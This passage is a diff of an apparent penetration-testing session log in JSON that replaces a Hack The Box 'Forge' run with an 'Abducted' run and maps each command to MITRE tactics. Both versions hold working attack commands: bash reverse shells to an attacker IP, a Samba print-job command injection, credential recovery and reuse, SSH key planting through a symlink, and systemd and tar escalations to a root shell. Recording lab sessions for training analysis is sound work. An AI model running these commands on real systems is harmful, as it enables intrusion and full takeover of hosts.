@@ -2,14 +2,14 @@
   "schema_version": "1.4",
   "session": {
     "uuid": "de00f0e1-0001-4000-8000-000000000001",
-    "started_at": "2026-06-01T20:00:00.000Z",
-    "ended_at": "2026-06-01T20:19:31.500Z",
-    "target_scope": "HTB :: Forge",
+    "started_at": "2026-07-07T19:00:00.000Z",
+    "ended_at": "2026-07-07T19:14:23.600Z",
+    "target_scope": "HTB :: Abducted",
     "context_path": "host",
     "shell": "bash",
     "source": "local_pty",
     "machine": {
-      "name": "Forge",
+      "name": "Abducted",
       "os": "Linux",
       "difficulty": "Medium",
       "retired": true
@@ -17,36 +17,36 @@
     "target": {
       "platform": "htb",
       "kind": "box",
-      "name": "Forge",
-      "slug": "forge",
+      "name": "Abducted",
+      "slug": "abducted",
       "os": "Linux",
       "difficulty": {
-        "level": 2,
+        "level": 3,
         "label": "Medium"
       },
       "emblem": {
-        "avatar": null,
-        "hue": 199
+        "avatar": "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1f1a05f-5c5d-4cca-8103-cf875d8e5698-1780591497.png",
+        "hue": null
       },
-      "url": "https://app.hackthebox.com/machines/forge"
+      "url": "https://app.hackthebox.com/machines/abducted"
     }
   },
   "episodes": [
     {
       "seq": 1,
-      "cmd": "nmap -sV -sC -oN scan 10.10.11.42",
+      "cmd": "nmap -p- --min-rate 10000 abducted.htb",
       "binary": "nmap",
-      "started_at_ms": 1780344002000,
-      "duration_ms": 45000,
+      "started_at_ms": 1783450802000,
+      "duration_ms": 48000,
       "gap_before_ms": 0,
       "exit_code": 0,
       "actor": "machine_bound",
-      "output_digest": "22/tcp ssh OpenSSH 8.2 · 80/tcp http Apache 2.4.41 (forge.htb)",
+      "output_digest": "22/tcp ssh · 139/tcp netbios-ssn · 445/tcp microsoft-ds — full TCP sweep",
       "tactic": "TA0007",
       "technique": "T1046",
       "confidence": 0.9,
       "noise_weight": 4,
-      "volume": 1000,
+      "volume": 2000,
       "context_path": "host",
       "alignment": "match",
       "loop_of_seq": null,
@@ -56,21 +56,21 @@
     },
     {
       "seq": 2,
-      "cmd": "gobuster dir -u http://forge.htb -w /usr/share/wordlists/dirb/common.txt",
-      "binary": "gobuster",
-      "started_at_ms": 1780344102000,
-      "duration_ms": 34000,
-      "gap_before_ms": 55000,
+      "cmd": "nmap -p 22,139,445 -sCV abducted.htb",
+      "binary": "nmap",
+      "started_at_ms": 1783450865000,
+      "duration_ms": 22000,
+      "gap_before_ms": 15000,
       "exit_code": 0,
       "actor": "machine_bound",
-      "output_digest": "/uploads (301) · /admin (301) · /api (200)",
+      "output_digest": "22/tcp OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 · 139,445/tcp Samba smbd 4.6.2 — looks like Ubuntu 24.04 LTS",
       "tactic": "TA0007",
-      "technique": "T1595.003",
-      "confidence": 0.85,
-      "noise_weight": 6,
-      "volume": 4614,
+      "technique": "T1046",
+      "confidence": 0.9,
+      "noise_weight": 4,
+      "volume": 100,
       "context_path": "host",
-      "alignment": "match",
+      "alignment": "alternative",
       "loop_of_seq": null,
       "frameworks": {
         "ukc": "reconnaissance"
@@ -78,19 +78,19 @@
     },
     {
       "seq": 3,
-      "cmd": "nikto -h http://forge.htb",
-      "binary": "nikto",
-      "started_at_ms": 1780344166000,
-      "duration_ms": 42000,
-      "gap_before_ms": 30000,
+      "cmd": "nmblookup -A abducted.htb",
+      "binary": "nmblookup",
+      "started_at_ms": 1783450907000,
+      "duration_ms": 3000,
+      "gap_before_ms": 20000,
       "exit_code": 0,
-      "actor": "machine_bound",
-      "output_digest": "Apache 2.4.41 · /admin exposed · 3 security headers missing",
+      "actor": "human_active",
+      "output_digest": "ABDUCTED <00><03><20> B · WORKGROUP <00><1d><1e> — <20> set, File Server Service is up",
       "tactic": "TA0007",
-      "technique": "T1595.003",
-      "confidence": 0.85,
-      "noise_weight": 7,
-      "volume": 2600,
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
       "context_path": "host",
       "alignment": "alternative",
       "loop_of_seq": null,
@@ -100,21 +100,21 @@
     },
     {
       "seq": 4,
-      "cmd": "curl -s http://forge.htb/api/",
-      "binary": "curl",
-      "started_at_ms": 1780344230000,
-      "duration_ms": 1200,
-      "gap_before_ms": 22000,
+      "cmd": "smbclient -L //abducted.htb/ -N",
+      "binary": "smbclient",
+      "started_at_ms": 1783450922000,
+      "duration_ms": 3500,
+      "gap_before_ms": 12000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "{\"endpoints\":[\"/api/user\",\"/api/login\"]}",
+      "output_digest": "HP-Reception (Printer) · projects (Disk) · transfer (Disk) · IPC$ — anonymous listing succeeds",
       "tactic": "TA0007",
-      "technique": "T1595",
-      "confidence": 0.55,
+      "technique": "T1059",
+      "confidence": 0.2,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
-      "alignment": "alternative",
+      "alignment": "match",
       "loop_of_seq": null,
       "frameworks": {
         "ukc": "reconnaissance"
@@ -122,67 +122,39 @@
     },
     {
       "seq": 5,
-      "cmd": "hydra -l admin -P rockyou.txt forge.htb http-post-form",
-      "binary": "hydra",
-      "started_at_ms": 1780344266200,
-      "duration_ms": 26000,
-      "gap_before_ms": 35000,
+      "cmd": "rpcclient -N abducted.htb -U \"\" -c enumdomusers",
+      "binary": "rpcclient",
+      "started_at_ms": 1783450935500,
+      "duration_ms": 2200,
+      "gap_before_ms": 10000,
       "exit_code": 0,
-      "actor": "machine_bound",
-      "output_digest": "16 of 16 targets completed, 0 valid passwords found — dead end",
-      "tactic": "TA0001",
-      "technique": "T1110",
-      "confidence": 0.8,
-      "noise_weight": 10,
-      "volume": 1900,
-      "context_path": "host",
-      "alignment": "detour",
-      "loop_of_seq": null,
-      "frameworks": {
-        "ukc": "exploitation",
-        "cwe": [
-          "CWE-307"
-        ]
-      }
-    },
-    {
-      "seq": 6,
-      "cmd": "sqlmap -u 'http://forge.htb/api/login' --data 'u=x&p=y' --batch --dump",
-      "binary": "sqlmap",
-      "started_at_ms": 1780344312200,
-      "duration_ms": 88000,
-      "gap_before_ms": 20000,
-      "exit_code": 0,
-      "actor": "machine_bound",
-      "output_digest": "parameter 'u' is injectable (boolean-blind) · dumped users: admin:$2b$10$… svc:$2b$10$…",
-      "tactic": "TA0001",
-      "technique": "T1190",
-      "confidence": 0.85,
-      "noise_weight": 8,
-      "volume": 3100,
+      "actor": "human_active",
+      "output_digest": "user:[scott] rid:[0x3e8] — single domain user, null session",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
       "context_path": "host",
       "alignment": "match",
       "loop_of_seq": null,
       "frameworks": {
-        "ukc": "exploitation",
-        "cwe": [
-          "CWE-89"
-        ]
+        "ukc": "reconnaissance"
       }
     },
     {
-      "seq": 7,
-      "cmd": "curl -s http://forge.htb/api/user?id=1",
-      "binary": "curl",
-      "started_at_ms": 1780344428200,
-      "duration_ms": 1400,
-      "gap_before_ms": 28000,
+      "seq": 6,
+      "cmd": "rpcclient -N abducted.htb -U \"\" -c netshareenumall",
+      "binary": "rpcclient",
+      "started_at_ms": 1783450943700,
+      "duration_ms": 2600,
+      "gap_before_ms": 6000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "{\"id\":1,\"user\":\"admin\",\"role\":\"admin\"} — revisiting the app from creds",
+      "output_digest": "HP-Reception -> C:\\var\\spool\\samba · projects -> C:\\srv\\projects · transfer -> C:\\srv\\transfer",
       "tactic": "TA0007",
-      "technique": "T1595",
-      "confidence": 0.55,
+      "technique": "T1059",
+      "confidence": 0.2,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
@@ -193,15 +165,15 @@
       }
     },
     {
-      "seq": 8,
-      "cmd": "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1",
-      "binary": "bash",
-      "started_at_ms": 1780344484600,
-      "duration_ms": 2000,
-      "gap_before_ms": 55000,
+      "seq": 7,
+      "cmd": "echo 'bash -i >& /dev/tcp/x.x.x.x/443 0>&1' > '|bash'",
+      "binary": "echo",
+      "started_at_ms": 1783451186300,
+      "duration_ms": 400,
+      "gap_before_ms": 240000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "www-data@forge:/var/www$ — reverse shell landed",
+      "output_digest": "payload written — the print command forwards the job description through %J unescaped (CVE-2026-4480)",
       "tactic": "TA0002",
       "technique": "T1059",
       "confidence": 0.85,
@@ -215,66 +187,88 @@
       }
     },
     {
-      "seq": 9,
-      "cmd": "whoami",
-      "binary": "whoami",
-      "started_at_ms": 1780344506600,
-      "duration_ms": 400,
-      "gap_before_ms": 20000,
+      "seq": 8,
+      "cmd": "nc -lnvp 443",
+      "binary": "nc",
+      "started_at_ms": 1783451194700,
+      "duration_ms": 600,
+      "gap_before_ms": 8000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "www-data",
-      "tactic": "TA0004",
-      "technique": "T1033",
-      "confidence": 0.6,
+      "output_digest": "listening on [any] 443 ...",
+      "tactic": "TA0002",
+      "technique": "T1059",
+      "confidence": 0.65,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "execution"
+      }
+    },
+    {
+      "seq": 9,
+      "cmd": "smbclient //abducted.htb/HP-Reception -N -c 'print \"|bash\"'",
+      "binary": "smbclient",
+      "started_at_ms": 1783451200300,
+      "duration_ms": 2800,
+      "gap_before_ms": 5000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "putting file |bash as the print job — job description runs as a shell command · nobody@abducted:/var/spool/samba$ (caught on the listener)",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
       "alignment": "alternative",
       "loop_of_seq": null,
       "frameworks": {
-        "ukc": "privilege-escalation"
+        "ukc": "reconnaissance"
       }
     },
     {
       "seq": 10,
-      "cmd": "id",
-      "binary": "id",
-      "started_at_ms": 1780344511000,
-      "duration_ms": 400,
-      "gap_before_ms": 4000,
+      "cmd": "script /dev/null -c bash",
+      "binary": "script",
+      "started_at_ms": 1783451209100,
+      "duration_ms": 1800,
+      "gap_before_ms": 6000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
-      "tactic": "TA0004",
-      "technique": "T1033",
-      "confidence": 0.6,
+      "output_digest": "nobody@abducted:/var/spool/samba$ — upgraded to a full tty",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
       "alignment": "alternative",
       "loop_of_seq": null,
       "frameworks": {
-        "ukc": "privilege-escalation"
+        "ukc": "reconnaissance"
       }
     },
     {
       "seq": 11,
-      "cmd": "./linpeas.sh",
-      "binary": "linpeas.sh",
-      "started_at_ms": 1780344536400,
-      "duration_ms": 62000,
-      "gap_before_ms": 25000,
+      "cmd": "whoami",
+      "binary": "whoami",
+      "started_at_ms": 1783451214900,
+      "duration_ms": 300,
+      "gap_before_ms": 4000,
       "exit_code": 0,
-      "actor": "machine_bound",
-      "output_digest": "SUID/interesting: sudo -l → (root) NOPASSWD: /usr/bin/tar · writable /opt/scripts",
+      "actor": "human_active",
+      "output_digest": "nobody",
       "tactic": "TA0004",
-      "technique": "T1068",
-      "confidence": 0.7,
+      "technique": "T1033",
+      "confidence": 0.6,
       "noise_weight": 1,
-      "volume": 300,
+      "volume": 1,
       "context_path": "host",
-      "alignment": "alternative",
+      "alignment": "match",
       "loop_of_seq": null,
       "frameworks": {
         "ukc": "privilege-escalation"
@@ -282,17 +276,17 @@
     },
     {
       "seq": 12,
-      "cmd": "find / -perm -4000 -type f 2>/dev/null",
-      "binary": "find",
-      "started_at_ms": 1780344638400,
-      "duration_ms": 8000,
-      "gap_before_ms": 40000,
+      "cmd": "id",
+      "binary": "id",
+      "started_at_ms": 1783451217700,
+      "duration_ms": 300,
+      "gap_before_ms": 2500,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "/usr/bin/tar · /usr/bin/passwd · /usr/bin/sudo · /usr/bin/mount",
+      "output_digest": "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)",
       "tactic": "TA0004",
-      "technique": "T1083",
-      "confidence": 0.5,
+      "technique": "T1033",
+      "confidence": 0.6,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
@@ -304,21 +298,21 @@
     },
     {
       "seq": 13,
-      "cmd": "getcap -r / 2>/dev/null",
-      "binary": "getcap",
-      "started_at_ms": 1780344664400,
-      "duration_ms": 6000,
-      "gap_before_ms": 18000,
+      "cmd": "cat /etc/passwd | grep 'sh$'",
+      "binary": "cat",
+      "started_at_ms": 1783451243000,
+      "duration_ms": 700,
+      "gap_before_ms": 25000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "/usr/bin/python3.8 = cap_setuid+ep (noted, not needed)",
+      "output_digest": "root:x:0:0:root:/root:/bin/bash · scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash · marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash",
       "tactic": "TA0004",
       "technique": "T1083",
       "confidence": 0.5,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
-      "alignment": "alternative",
+      "alignment": "match",
       "loop_of_seq": null,
       "frameworks": {
         "ukc": "privilege-escalation"
@@ -326,14 +320,14 @@
     },
     {
       "seq": 14,
-      "cmd": "cat /home/svc/user.txt",
-      "binary": "cat",
-      "started_at_ms": 1780344700400,
-      "duration_ms": 400,
-      "gap_before_ms": 30000,
+      "cmd": "ls /opt/offsite-backup",
+      "binary": "ls",
+      "started_at_ms": 1783451278700,
+      "duration_ms": 500,
+      "gap_before_ms": 35000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
+      "output_digest": "rclone.conf  sync.sh",
       "tactic": "TA0004",
       "technique": "T1083",
       "confidence": 0.5,
@@ -348,20 +342,21 @@
     },
     {
       "seq": 15,
-      "cmd": "",
-      "binary": "",
-      "started_at_ms": 1780345060800,
-      "duration_ms": 0,
-      "gap_before_ms": 360000,
-      "exit_code": null,
-      "actor": "think_pause",
-      "output_digest": "long pause — reasoning or stuck",
+      "cmd": "cat /opt/offsite-backup/rclone.conf",
+      "binary": "cat",
+      "started_at_ms": 1783451283200,
+      "duration_ms": 400,
+      "gap_before_ms": 4000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "[offsite] type = sftp · host = backup.hartley-group.internal · user = svc-backup · pass = [redacted] (rclone-obscured)",
       "tactic": "TA0004",
-      "confidence": 0,
-      "noise_weight": 0,
-      "volume": 0,
+      "technique": "T1083",
+      "confidence": 0.5,
+      "noise_weight": 1,
+      "volume": 1,
       "context_path": "host",
-      "alignment": null,
+      "alignment": "match",
       "loop_of_seq": null,
       "frameworks": {
         "ukc": "privilege-escalation"
@@ -369,39 +364,61 @@
     },
     {
       "seq": 16,
-      "cmd": "sudo -l",
-      "binary": "sudo",
-      "started_at_ms": 1780345060800,
-      "duration_ms": 500,
-      "gap_before_ms": 0,
+      "cmd": "rclone reveal [redacted]",
+      "binary": "rclone",
+      "started_at_ms": 1783451298600,
+      "duration_ms": 700,
+      "gap_before_ms": 15000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "User www-data may run the following: (root) NOPASSWD: /usr/bin/tar",
-      "tactic": "TA0004",
-      "technique": "T1548",
-      "confidence": 0.85,
+      "output_digest": "[redacted] — plaintext offsite-backup password",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
-      "alignment": "match",
+      "alignment": "alternative",
       "loop_of_seq": null,
       "frameworks": {
-        "ukc": "privilege-escalation"
+        "ukc": "reconnaissance"
       }
     },
     {
       "seq": 17,
-      "cmd": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
-      "binary": "sudo",
-      "started_at_ms": 1780345151300,
-      "duration_ms": 1800,
+      "cmd": "su - scott",
+      "binary": "su",
+      "started_at_ms": 1783451309300,
+      "duration_ms": 2000,
+      "gap_before_ms": 10000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "Password: [redacted] · scott@abducted:~$ — the offsite-backup password is reused for the local account",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 18,
+      "cmd": "cat user.txt",
+      "binary": "cat",
+      "started_at_ms": 1783451401300,
+      "duration_ms": 400,
       "gap_before_ms": 90000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "# id → uid=0(root) (GTFOBins: tar)",
+      "output_digest": "[redacted-flag]",
       "tactic": "TA0004",
-      "technique": "T1548",
-      "confidence": 0.85,
+      "technique": "T1083",
+      "confidence": 0.5,
       "noise_weight": 1,
       "volume": 1,
       "context_path": "host",
@@ -412,15 +429,257 @@
       }
     },
     {
-      "seq": 18,
-      "cmd": "cat /root/root.txt",
+      "seq": 19,
+      "cmd": "cat /etc/samba/shares.conf",
       "binary": "cat",
-      "started_at_ms": 1780345171100,
-      "duration_ms": 400,
-      "gap_before_ms": 18000,
+      "started_at_ms": 1783451461700,
+      "duration_ms": 900,
+      "gap_before_ms": 60000,
       "exit_code": 0,
       "actor": "human_active",
-      "output_digest": "f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1",
+      "output_digest": "[transfer] valid users = scott · force user = marcus · read only = no · wide links = yes · (global) allow insecure wide links = yes",
+      "tactic": "TA0004",
+      "technique": "T1083",
+      "confidence": 0.5,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "privilege-escalation"
+      }
+    },
+    {
+      "seq": 20,
+      "cmd": "ln -s /home/marcus /srv/transfer/marcus-link",
+      "binary": "ln",
+      "started_at_ms": 1783451492600,
+      "duration_ms": 400,
+      "gap_before_ms": 30000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "symlink created — wide links + force user=marcus lets the link resolve outside the share root",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 21,
+      "cmd": "smbclient //abducted.htb/transfer -U scott%[redacted] -c 'mkdir marcus-link/.ssh; put id_ed25519.pub marcus-link/.ssh/authorized_keys'",
+      "binary": "smbclient",
+      "started_at_ms": 1783451513000,
+      "duration_ms": 3200,
+      "gap_before_ms": 20000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "putting id_ed25519.pub as marcus-link\\.ssh\\authorized_keys — written to disk as marcus (force user)",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 22,
+      "cmd": "ssh -o IdentityFile=./id_ed25519 marcus@abducted.htb",
+      "binary": "ssh",
+      "started_at_ms": 1783451541200,
+      "duration_ms": 2500,
+      "gap_before_ms": 25000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "marcus@abducted:~$ — key-based login, no password needed",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 23,
+      "cmd": "id",
+      "binary": "id",
+      "started_at_ms": 1783451546700,
+      "duration_ms": 300,
+      "gap_before_ms": 3000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators) — marcus is in the operators group",
+      "tactic": "TA0004",
+      "technique": "T1033",
+      "confidence": 0.6,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "alternative",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "privilege-escalation"
+      }
+    },
+    {
+      "seq": 24,
+      "cmd": "ls -ld /etc/systemd/system/smbd.service.d/",
+      "binary": "ls",
+      "started_at_ms": 1783451587000,
+      "duration_ms": 500,
+      "gap_before_ms": 40000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "drwxrwxr-x 2 root operators 4096 ... — group-writable by operators",
+      "tactic": "TA0004",
+      "technique": "T1083",
+      "confidence": 0.5,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "privilege-escalation"
+      }
+    },
+    {
+      "seq": 25,
+      "cmd": "echo -e '[Service]\\nExecStartPre=-/bin/bash -c \"cp /bin/bash /tmp/.rootbash; chmod 6777 /tmp/.rootbash\"' > /etc/systemd/system/smbd.service.d/override.conf",
+      "binary": "echo",
+      "started_at_ms": 1783451632500,
+      "duration_ms": 600,
+      "gap_before_ms": 45000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "drop-in written — ExecStartPre runs as root the next time smbd (re)starts",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 26,
+      "cmd": "systemctl daemon-reload",
+      "binary": "systemctl",
+      "started_at_ms": 1783451639100,
+      "duration_ms": 900,
+      "gap_before_ms": 6000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "unit files reloaded",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 27,
+      "cmd": "systemctl restart smbd",
+      "binary": "systemctl",
+      "started_at_ms": 1783451644000,
+      "duration_ms": 2400,
+      "gap_before_ms": 4000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "smbd restarted — ExecStartPre ran as root; /tmp/.rootbash is now a SetUID root bash",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "alternative",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 28,
+      "cmd": "/tmp/.rootbash -p",
+      "binary": ".rootbash",
+      "started_at_ms": 1783451654400,
+      "duration_ms": 500,
+      "gap_before_ms": 8000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "bash-5.2# — SetUID shell spawned",
+      "tactic": "TA0007",
+      "technique": "T1059",
+      "confidence": 0.2,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "alternative",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "reconnaissance"
+      }
+    },
+    {
+      "seq": 29,
+      "cmd": "whoami",
+      "binary": "whoami",
+      "started_at_ms": 1783451656900,
+      "duration_ms": 300,
+      "gap_before_ms": 2000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "root",
+      "tactic": "TA0004",
+      "technique": "T1033",
+      "confidence": 0.6,
+      "noise_weight": 1,
+      "volume": 1,
+      "context_path": "host",
+      "alignment": "match",
+      "loop_of_seq": null,
+      "frameworks": {
+        "ukc": "privilege-escalation"
+      }
+    },
+    {
+      "seq": 30,
+      "cmd": "cat root.txt",
+      "binary": "cat",
+      "started_at_ms": 1783451663200,
+      "duration_ms": 400,
+      "gap_before_ms": 6000,
+      "exit_code": 0,
+      "actor": "human_active",
+      "output_digest": "[redacted-flag]",
       "tactic": "TA0004",
       "technique": "T1083",
       "confidence": 0.5,
@@ -438,30 +697,23 @@
     {
       "mitre_tactic": "TA0007",
       "label": "Discovery",
-      "started_at": "2026-06-01T20:00:00.000Z",
-      "ended_at": "2026-06-01T20:07:07.600Z",
+      "started_at": "2026-07-07T19:00:00.000Z",
+      "ended_at": "2026-07-07T19:14:12.900Z",
       "efficiency_pct": 100
-    },
-    {
-      "mitre_tactic": "TA0001",
-      "label": "Initial Access",
-      "started_at": "2026-06-01T20:03:49.200Z",
-      "ended_at": "2026-06-01T20:06:38.200Z",
-      "efficiency_pct": 64
     },
     {
       "mitre_tactic": "TA0002",
       "label": "Execution",
-      "started_at": "2026-06-01T20:07:07.600Z",
-      "ended_at": "2026-06-01T20:08:04.600Z",
+      "started_at": "2026-07-07T19:02:24.300Z",
+      "ended_at": "2026-07-07T19:06:33.300Z",
       "efficiency_pct": 100
     },
     {
       "mitre_tactic": "TA0004",
       "label": "Privilege Escalation",
-      "started_at": "2026-06-01T20:08:04.600Z",
-      "ended_at": "2026-06-01T20:19:29.500Z",
-      "efficiency_pct": 53
+      "started_at": "2026-07-07T19:06:48.900Z",
+      "ended_at": "2026-07-07T19:14:21.600Z",
+      "efficiency_pct": 100
     }
   ],
   "golden_dag": [
@@ -477,43 +729,77 @@
       "proven_by_seq": null
     },
     {
-      "objective": "enumerate_web_content",
+      "objective": "enumerate_smb_shares",
       "tactic": "TA0007",
       "satisfied_by": [
-        "gobuster",
-        "feroxbuster"
+        "smbclient -L"
       ],
       "depends_on": [
         "enumerate_services"
       ],
-      "user_satisfied_by_seq": 2,
+      "user_satisfied_by_seq": 4,
       "status": "reached",
       "finding_refs": [],
       "proven_by_seq": null
     },
     {
-      "objective": "exploit_sql_injection",
-      "tactic": "TA0001",
+      "objective": "enumerate_domain_users",
+      "tactic": "TA0007",
       "satisfied_by": [
-        "sqlmap"
+        "rpcclient"
       ],
       "depends_on": [
-        "enumerate_web_content"
+        "enumerate_services"
       ],
-      "user_satisfied_by_seq": 6,
+      "user_satisfied_by_seq": 5,
       "status": "reached",
+      "finding_refs": [
+        "cred:ef1fc8ca"
+      ],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "audit_share_permissions",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "smbmap",
+        "crackmapexec --shares"
+      ],
+      "depends_on": [
+        "enumerate_smb_shares"
+      ],
+      "user_satisfied_by_seq": null,
+      "status": "untouched",
       "finding_refs": [],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "exploit_print_injection",
+      "tactic": "TA0002",
+      "satisfied_by": [
+        "echo",
+        "smbclient print"
+      ],
+      "depends_on": [
+        "enumerate_smb_shares",
+        "enumerate_domain_users"
+      ],
+      "user_satisfied_by_seq": 7,
+      "status": "reached",
+      "finding_refs": [
+        "vuln:CVE-2026-4480"
+      ],
       "proven_by_seq": null
     },
     {
       "objective": "get_foothold",
       "tactic": "TA0002",
       "satisfied_by": [
-        "bash reverse shell",
-        "nc"
+        "nc",
+        "ncat"
       ],
       "depends_on": [
-        "exploit_sql_injection"
+        "exploit_print_injection"
       ],
       "user_satisfied_by_seq": 8,
       "status": "reached",
@@ -521,35 +807,77 @@
       "proven_by_seq": null
     },
     {
-      "objective": "enumerate_privesc",
+      "objective": "orient_as_nobody",
       "tactic": "TA0004",
       "satisfied_by": [
-        "linpeas",
-        "linpeas.sh"
+        "whoami"
       ],
       "depends_on": [
         "get_foothold"
       ],
       "user_satisfied_by_seq": 11,
       "status": "reached",
-      "finding_refs": [
-        "cred:461681d7"
-      ],
+      "finding_refs": [],
       "proven_by_seq": null
     },
     {
-      "objective": "check_cron_jobs",
+      "objective": "enumerate_target_users",
       "tactic": "TA0004",
       "satisfied_by": [
-        "pspy",
-        "pspy64"
+        "cat /etc/passwd"
       ],
       "depends_on": [
         "get_foothold"
       ],
-      "user_satisfied_by_seq": null,
-      "status": "untouched",
+      "user_satisfied_by_seq": 13,
+      "status": "reached",
       "finding_refs": [],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "discover_offsite_backup_creds",
+      "tactic": "TA0004",
+      "satisfied_by": [
+        "ls"
+      ],
+      "depends_on": [
+        "enumerate_target_users"
+      ],
+      "user_satisfied_by_seq": 14,
+      "status": "reached",
+      "finding_refs": [],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "read_rclone_config",
+      "tactic": "TA0004",
+      "satisfied_by": [
+        "cat /opt/offsite-backup/rclone.conf"
+      ],
+      "depends_on": [
+        "discover_offsite_backup_creds"
+      ],
+      "user_satisfied_by_seq": 15,
+      "status": "reached",
+      "finding_refs": [
+        "cred:b69f9bc7"
+      ],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "reuse_cred_as_scott",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "su -"
+      ],
+      "depends_on": [
+        "read_rclone_config"
+      ],
+      "user_satisfied_by_seq": 17,
+      "status": "reached",
+      "finding_refs": [
+        "cred:f33c9983"
+      ],
       "proven_by_seq": null
     },
     {
@@ -559,26 +887,113 @@
         "cat user.txt"
       ],
       "depends_on": [
-        "get_foothold"
+        "reuse_cred_as_scott"
       ],
-      "user_satisfied_by_seq": 14,
+      "user_satisfied_by_seq": 18,
       "status": "proven",
       "finding_refs": [
-        "flag:user",
